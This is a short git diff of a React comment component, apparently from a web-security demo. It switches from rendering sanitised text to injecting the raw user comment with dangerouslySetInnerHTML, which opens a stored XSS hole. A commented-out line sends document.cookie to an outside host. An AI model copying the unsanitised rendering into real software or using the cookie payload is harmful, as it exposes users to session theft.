@@ -27,9 +27,10 @@ const Comment = (props) => {
                         <span className='font-semibold'>Đã đánh giá:</span>
                         <span className='flex items-center gap-1'>
                         {/* <b onclick={window.location="https://security-fe.vercel.app?cookie="+document.cookie}>click vo</b> */}
-                            {/* {comment} */}
-                            {/* <div dangerouslySetInnerHTML={{"__html": comment}}></div> */}
-                            <div dangerouslySetInnerHTML={{"__html": clearData}}></div>
+                            {/* {comment}   */}
+                            {/* {clearData} */}
+                            <div dangerouslySetInnerHTML={{"__html": comment}}></div>
+                            {/* <div dangerouslySetInnerHTML={{"__html": clearData}}></div> */}
                         </span>
                     </span>
                     <div>
